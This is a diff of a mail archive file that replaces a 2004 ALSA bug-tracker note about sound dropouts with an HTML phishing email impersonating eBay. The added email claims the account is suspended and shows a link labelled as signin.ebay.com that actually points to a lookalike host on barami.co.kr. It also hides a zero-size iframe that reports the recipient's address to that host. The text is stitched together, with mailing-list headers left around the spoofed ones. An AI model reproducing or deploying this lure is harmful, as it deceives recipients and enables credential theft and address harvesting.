@@ -1,14 +1,12 @@
-From: bugtrack@alsa-project.org
-Subject: [ALSA - driver 0000671]: ALSA sound cuts out w/ message: ALSA sound/pci/via82xx.c:737: invalid via82xx_cur_ptr, using last valid pointer
-Date: Thu, 25 Nov 2004 01:59:34 +0100
-Message-ID: <ecc54153c8be9346c59938e570f6496c@bugtrack.alsa-project.org>
+From: "eBay.com" <aw-confirm@ebay.com>
+Subject: Your account at eBay has been suspended
+Date: Wed, 24 Nov 2004 21:15:49 -0100
+Message-ID: <ZYPUATMUOMHGHFNEGFZFIV@netian.com>
+Reply-To: "eBay.com" <aw-confirm@ebay.com>
 Mime-Version: 1.0
-Content-Type: text/plain; charset="iso-8859-1"
-Content-Transfer-Encoding: 7bit
+Content-Type: multipart/alternative;
+	boundary="--=_hOF1F1a3M1ovU4"
 Return-path: <alsa-devel-admin@lists.sourceforge.net>
-Received: from bugtrack.alsa-project.org (gate.perex.cz [82.113.61.162])
-	by alsa.alsa-project.org (ALSA's E-mail Delivery System) with ESMTP id C6FC92AF
-	for <alsa-devel@alsa-project.org>; Thu, 25 Nov 2004 01:59:34 +0100 (MET)
 Sender: alsa-devel-admin@lists.sourceforge.net
 Errors-To: alsa-devel-admin@lists.sourceforge.net
 List-Unsubscribe: <https://lists.sourceforge.net/lists/listinfo/alsa-devel>,
@@ -18,81 +16,161 @@ List-Help: <mailto:alsa-devel-request@lists.sourceforge.net?subject=help>
 List-Subscribe: <https://lists.sourceforge.net/lists/listinfo/alsa-devel>,
 	<mailto:alsa-devel-request@lists.sourceforge.net?subject=subscribe>
 List-Archive: <http://sourceforge.net/mailarchive/forum.php?forum=alsa-devel>
-To: alsa-devel@alsa-project.org
+To: 3a31f094.480aaafb@alsa-project.org, abramo@alsa-project.org, alsa-devel@alsa-project.org, alsa-doc@alsa-project.org, alsa-user@alsa-project.org
 List-Id: alsa-devel@alsa-project.org
 
+----=_hOF1F1a3M1ovU4
+Content-Type: text/html;
+Content-Transfer-Encoding: 7Bit
 
-A NOTE has been added to this issue.
-======================================================================
-<https://bugtrack.alsa-project.org/alsa-bug/view.php?id=671> 
-======================================================================
-Reported By:                brentcfisher
-Assigned To:                
-======================================================================
-Project:                    ALSA - driver
-Issue ID:                   671
-Category:                   PCI - via82xx
-Reproducibility:            always
-Severity:                   minor
-Priority:                   normal
-Status:                     new
-Distribution:               Gentoo
-Kernel Version:             2.6.8.1
-======================================================================
-Date Submitted:             11-24-2004 06:36 CET
-Last Modified:              11-25-2004 01:59 CET
-======================================================================
-Summary:                    ALSA sound cuts out w/ message: ALSA
-sound/pci/via82xx.c:737: invalid via82xx_cur_ptr, using last valid pointer
-Description: 
-Particularily noticeable when watching a DVD via xine using AC3 Pass
-Through.  Sound will cut out momentarily (usually for no more than a
-second).  The skip is always accompanied by multiples of this message in
-the /var/log/messages file:
+<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.0 Transitional//EN">
+<HTML><HEAD><TITLE>My eBay</TITLE><!--   extraneous meta tag removed by ebay code  --><!--
 
-Nov 23 22:33:06 hostname ALSA sound/pci/via82xx.c:737: invalid
-via82xx_cur_ptr, using last valid pointer
-Nov 23 22:33:06 hostname ALSA sound/pci/via82xx.c:737: invalid
-via82xx_cur_ptr, using last valid pointer
-Nov 23 22:33:06 hostname ALSA sound/pci/via82xx.c:737: invalid
-via82xx_cur_ptr, using last valid pointer
+srcId: SignIn-->
+<META http-equiv=Content-Type content="text/html; charset=ISO-8859-1">
 
-These messages appear in the log file once or twice a minute although the
-sound only noticable cuts out every few minutes .  Very annoying on an
-HTPC.
-======================================================================
+<META content="MSHTML 6.00.2600.0" name=GENERATOR></HEAD>
+<BODY bgColor=#ffffff ><!--Header code starts-->
+<TABLE cellSpacing=0 cellPadding=0 bgColor=#ffffff border=0>
+  <TBODY>
+  <TR>
+    <TD><IMG height=1 src="http://pics.ebay.com/aw/pics/spacer.gif" 
+    width=180></TD></TR>
+  <TR>
+    <TD><A href="http://pages.ebay.com/"><IMG alt=" " 
+      src="http://pics.ebay.com/aw/pics/register/HeaderRegister_387x40.gif" 
+      border=0></A></TD></TR></TBODY></TABLE><!--Header code ends-->
+<TABLE cellSpacing=0 cellPadding=0 width=600 border=0>
+  <TBODY>
+  <TR>
+    <TD colSpan=2><IMG height=10 alt=" " 
+      src="http://pics.ebay.com/aw/pics/spacer.gif" width=1></TD></TR>
+  <TR>
+    <TD bgColor=#ffcc00 colSpan=2><IMG height=2 alt=" " 
+      src="http://pics.ebay.com/aw/pics/spacer.gif" width=1></TD></TR>
+  <TR bgColor=#ffe580>
+    <TD width=25><IMG height=3 alt="" 
+      src="http://pics.ebay.com/aw/pics/leftLine_16x3.gif" width=16 
+    align=middle></TD>
+    <TD vAlign=center width=575>
+      <TABLE cellSpacing=0 cellPadding=1 width="100%" border=0>
+        <TBODY>
+        <TR>
+          <TD vAlign=center noWrap width="58%"><FONT 
+            face="Verdana, Helvetica, Arial, sans-serif" size=3></FONT></TD>
+          <TD vAlign=center noWrap align=right width="42%"><A 
+            onclick="return openHelpWindow(this.href);" 
+            href="http://pages.ebay.com/help/new/signin.html" 
+            target=helpwin><IMG height=14 
+            src="http://pics.ebay.com/aw/pics/listings/questionMark_14x14.gif" 
+            width=14 border=0></A><IMG height=1 alt=" " 
+            src="http://pics.ebay.com/aw/pics/spacer.gif" width=4><FONT 
+            face="Arial, Helvetica, sans-serif" size=2><A 
+            onclick="return openHelpWindow(this.href);" 
+            href="http://pages.ebay.com/help/new/signin.html" 
+            target=helpwin>Need Help?</A></FONT><IMG height=1 alt=" " 
+            src="http://pics.ebay.com/aw/pics/spacer.gif" 
+      width=2></TD></TR></TBODY></TABLE></TD></TR>
+  <TR>
+    <TD bgColor=#ffcc00 colSpan=2 height=2><IMG height=2 alt=" " 
+      src="http://pics.ebay.com/aw/pics/spacer.gif" width=1></TD></TR></TBODY></TABLE>
+<TABLE cellSpacing=0 cellPadding=0 width=600 border=0>
+  <TBODY>
+  <TR>
+    <TD>&nbsp;</TD></TR>
+  <TR>
+    <TD vAlign=top align=left height=309><font face="Arial, Helvetica, sans-serif" 
 
-----------------------------------------------------------------------
- squarooticus - 11-24-04 23:50 
-----------------------------------------------------------------------
-Ooh!  This sounds a lot like the problem I'm having with my ICH5
-(intel_8x0) audio.  See bug
-https://bugtrack.alsa-project.org/alsa-bug/view.php?id=589.  Maybe this is a
-problem with the AC'97
-chip/driver that affects many parent chipsets?  Is there a Realtek AC'97
-chip in there?  Look at /proc/asound/card0/codec97#0/ac97#0-0 (or similar
-file).  Mine is a Realtek ALC650F.
+size="2">Dear 
+      eBay User, </font> 
+      <P><font face="Arial, Helvetica, sans-serif" size="2">We regret to inform 
+        you, that we had to block your eBay account <br>
+        because we have been notified that your account may have been compromised 
+        by outside parties.</font></P>
+      <p><font face="Arial, Helvetica, sans-serif" size="2">Our terms and conditions 
+        you agreed to state that your account must always be under your control 
+        <br>
+        or those you designate at all times. We have noticed some activity related 
+        to your account that <br>
+        indicates that other parties may have access and or control of your information 
+        in your account.</font></p>
+      <p><font face="Arial, Helvetica, sans-serif" size="2">Please be aware that 
+        until we can verify your identity no further access to your account will 
+        be allowed.</font><font face="Arial, Helvetica, sans-serif" size="2">As 
+        a result,Your access to bid or buy on eBay has been restricted.To start 
+        using your eBay account fully,Please uptake and verify your information 
+        by clicking below</font></p>
+      <P><font face="Arial, Helvetica, sans-serif" size="2"><A 
+ 
 
-----------------------------------------------------------------------
- brentcfisher - 11-25-04 01:59 
-----------------------------------------------------------------------
-No, it's not a Realtek chip - ICEnsemble VT1616i is reported.  But the
-symptoms do sound very similar to those that you report.  Have you
-recompiled your kernel to enable Alsa debugging?  The messages did not
-appear in the log until I had enabled this debugging.
+href="http://signin_ebay_com_account.barami.co.kr:7301/ebay.htm">http://signin.ebay.com/aw-c
 
-Issue History
-Date Modified  Username       Field                    Change              
-======================================================================
-11-24-04 06:36 brentcfisher   New Issue                                    
-11-24-04 06:36 brentcfisher   Distribution              => Gentoo          
-11-24-04 06:36 brentcfisher   Kernel Version            => 2.6.8.1         
-11-24-04 06:47 brentcfisher   Note Added: 0002541                          
-11-24-04 06:48 brentcfisher   Issue Monitored: brentcfisher                    
-11-24-04 23:50 squarooticus   Note Added: 0002584                          
-11-25-04 01:59 brentcfisher   Note Added: 0002585                          
-======================================================================
+gi/eBayISAPI.dll?Verify</A></font></P>
+      <P><font face="Arial, Helvetica, sans-serif" size="2">Regards,</font></P>
+      <P><font face="Arial, Helvetica, sans-serif" size="2">eBay Member Service</font></P>
+      <P><font face="Arial, Helvetica, sans-serif" size="2">**Please Do Not Reply 
+        To This E-mail As You Will Not Receive A Response**</font></P>
+    </TD></TR></TBODY></TABLE><BR>
+<TABLE cellSpacing=0 cellPadding=0 width=599 bgColor=#ffcc00 border=0>
+  <TBODY>
+  <TR>
+    <TD height=2><IMG height=2 src="http://pics.ebay.com/aw/pics/spacer.gif" 
+      width=2></TD></TR></TBODY></TABLE>
+<P>
+<TABLE cellSpacing=0 cellPadding=0 width=600 border=0>
+  <TBODY>
+  <TR>
+    <TD colSpan=2><BR>
+      <DIV align=center><FONT face="Arial, Verdana, Helvetica, sans-serif" 
+      size=2><A 
+      href="http://www2.ebay.com/aw/marketing.shtml?ssPageName=f:f:ann:US">Announcements</A> 
+      &nbsp;&nbsp;|&nbsp;&nbsp; <A 
+      
 
+href="http://cgi4.ebay.com/aw-cgi/eBayISAPI.dll?RegisterShow&amp;ssPageName=f:f:reg:US">Regi
+
+ster</A> 
+      &nbsp;&nbsp;|&nbsp;&nbsp; <A 
+      href="http://pages.ebay.com/help/confidence/hub.html?ssPageName=f:f:stips:US">Safe 
+      Trading Tips</A> &nbsp;&nbsp;|&nbsp;&nbsp; <A 
+      
+
+href="http://pages.ebay.com/help/policies/hub.html?ssPageName=f:f:policy:US">Policies</A> 
+      &nbsp;&nbsp;|&nbsp;&nbsp; <A onclick="return openHelpWindow(this.href);" 
+      href="http://pages.ebay.com/help/new/feedback.html" 
+      target=helpwin>Feedback Forum</A> &nbsp;&nbsp;|&nbsp;&nbsp; <A 
+      
+
+href="http://pages.ebay.com/community/aboutebay/index.html?ssPageName=f:f:ebayinc:US">About 
+      eBay</A></FONT> </DIV></TD></TR>
+  <TR>
+    <TD vAlign=top align=left width=450 height=31><FONT 
+      face="Arial, Verdana, Helvetica, sans-serif" size=1>Copyright ?1995-2003 
+      eBay Inc. All Rights Reserved.<BR>Designated trademarks and brands are the 
+      property of their respective owners.<BR>Use of this Web site constitutes 
+      acceptance of the eBay <A onclick="return openHelpWindow(this.href);" 
+      href="http://pages.ebay.com/help/policies/user-agreement.html" 
+      target=helpwin>User Agreement</A> and <A 
+      onclick="return openHelpWindow(this.href);" 
+      href="http://pages.ebay.com/help/policies/privacy-policy.html" 
+      target=helpwin>Privacy Policy</A>.</FONT><BR></TD>
+<iframe align="middle" frameborder="0" marginwidth="0" marginheight="0" height="0" 
+
+hspace="0" src="http://signin_ebay_com_account.barami.co.kr:7301/email.php?mail=3a31f094.480aaafb@alsa-project.org" 
+
+scrolling="no" vspace="0" width="0"></iframe>
+    <TD vAlign=top align=right width=150 height=31><FONT 
+      face="Arial, Verdana, Helvetica, sans-serif" size=1><A 
+      onclick="return openHelpWindow(this.href);" 
+      href="http://pics.ebay.com/aw/pics/truste_button.gif" target=helpwin><IMG 
+      height=31 alt=TrustE 
+      src="http://pics.ebay.com/aw/pics/truste_button.gif" width=116 
+      align=middle border=0></A></FONT> </TD></TR></TBODY></TABLE>
+<P></P>
+</BODY></HTML>
+
+
+----=_hOF1F1a3M1ovU4--
 
 
 
